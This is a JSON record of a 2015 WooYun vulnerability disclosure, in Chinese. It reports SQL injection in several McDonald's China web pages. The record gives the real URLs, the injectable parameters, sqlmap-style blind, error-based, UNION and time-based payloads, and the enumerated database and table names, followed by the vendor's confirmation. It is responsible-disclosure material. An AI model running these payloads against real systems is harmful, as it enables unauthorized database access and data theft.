{"id": 45799, "wybug_id": "wooyun-2015-094206", "wybug_title": "麦当劳多处SQL注入打包", "wybug_corp": "麦当劳(中国)有限公司", "wybug_author": "Mr.light", "wybug_date": "2015-01-27 17:01", "wybug_open_date": "2015-03-13 17:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-13：\t细节向公众公开  简要描述： 吃了次麦当劳 详细说明：  对麦当劳进行次扫描，发现了多处SQL注入漏洞，直接打包列出来吧。如下：http://rl.mcdonalds.com.cn/rl/cid.php?pid=http://www1.mcdonalds.com.cn/list/quality/index.php?DocTypeId=61http://rl.mcdonalds.com.cn/rl/index.php?province=&city=&type2=&address=&range=&curpage=1http://www1.mcdonalds.com.cn/list/quality/cid.php?DocTypeId=\nPlace: GETParameter: pid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: pid=' AND 5109=5109 AND 'NysH'='NysH    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: pid=' AND (SELECT 3550 FROM(SELECT COUNT(*),CONCAT(0x7165716871,(SELECT (CASE WHEN (3550=3550) THEN 1 ELSE 0 END)),0x7176706671,FLOOR(RAND(0)*2))xFROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'GtCQ'='GtCQ    Type: UNION query    Title: MySQL UNION query (NULL) - 8 columns    Payload: pid=' UNION ALL SELECT CONCAT(0x7165716871,0x62664869745743486f6c,0x7176706671),NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: pid=' AND SLEEP(5) AND 'PFWM'='PFWM\n\nPlace: GETParameter: DocTypeId    Type: boolean-based blind    Title: MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)    Payload: DocTypeId=MAKE_SET(1992=1992,61)    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)    Payload: DocTypeId=61 AND EXTRACTVALUE(7998,CONCAT(0x5c,0x71626f7871,(SELECT (CASE WHEN (7998=7998) THEN 1 ELSE 0 END)),0x716a6c6f71))\n\nPlace: GETParameter: province    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace (original value)    Payload: province=(SELECT (CASE WHEN (7049=7049) THEN '' ELSE 7049*(SELECT 7049 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&city=&type2=&address=&range=&curpage=1    Type: error-based    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause    Payload: province=-3519 OR (SELECT 4147 FROM(SELECT COUNT(*),CONCAT(0x7162787971,(SELECT (CASE WHEN (4147=4147) THEN 1 ELSE 0 END)),0x7168766471,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&city=&type2=&address=&range=&curpage=1    Type: UNION query    Title: MySQL UNION query (random number) - 8 columns    Payload: province=-9638 UNION ALL SELECT 8439,8439,8439,8439,CONCAT(0x7162787971,0x524d6b74755453744c4a,0x7168766471),8439,8439,8439#&city=&type2=&address=&range=&curpage=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 OR time-based blind    Payload: province=-1356 OR 8207=SLEEP(5)&city=&type2=&address=&range=&curpage=1\n   漏洞证明：  \n[*] information_schema[*] mcdonalds_rl[*] mcdonalds_rl_test[*] mysql\n\n+-----------------------------+| admin_role                  || area                        || area_copy                   || faq                         || food                        || fooddocmanager              || foodstandard                || foodstandard_copy           || foodsupplier                || foodsupplier_copy           || foodsupplieranddoctypematch || foodsupplierchild           || foodsupplierchild_copy      || foodsupplierchild_copy1     || foodsupplierdoc             || foodsupplierdoc_copy        || foodsupplierdoc_copy1       || foodsupplierdoc_copy2       || foodsupplierdoc_copy3       || foodsupplierdoc_copy4       || foodsupplierdoc_copy5       || foodsupplierdoc_copy6       || foodsupplierdoc_copy7       || foodsupplierdocstyle        || foodsupplierdoctype         || foodsupplierdoctype_copy    || foodsupplierfile            || foodsuppliergroup           || foodsuppliergrouplist       || foodsuppliergrouplist_copy  || foodtype                    || log                         || mc_log                      || mc_mail_log                 || mc_mail_title               || mc_manager                  || mc_manager_suppliergroup    || mc_partner                  || mc_role                     || rl                          || rl2                         || rl_copy_20150111            || temp                        || temp1                       || temp2                       || temp3                       || temp4                       || temp5                       || temp52                      || temp6                       || temp7                       || temp8                       || temp9                       |+-----------------------------+\n\nDatabase: mysql[23 tables]+---------------------------+| user                      || columns_priv              || db                        || event                     || func                      || general_log               || help_category             || help_keyword              || help_relation             || help_topic                || host                      || ndb_binlog_index          || plugin                    || proc                      || procs_priv                || servers                   || slow_log                  || tables_priv               || time_zone                 || time_zone_leap_second     || time_zone_name            || time_zone_transition      || time_zone_transition_type |+---------------------------+\n   修复方案：  过滤   版权声明：转载请注明来源 Mr.light@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-29 00:30 厂商回复： 网站存在SQL注入问题发现已久，由于采用托管模式，修复漏洞需要一定时间。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}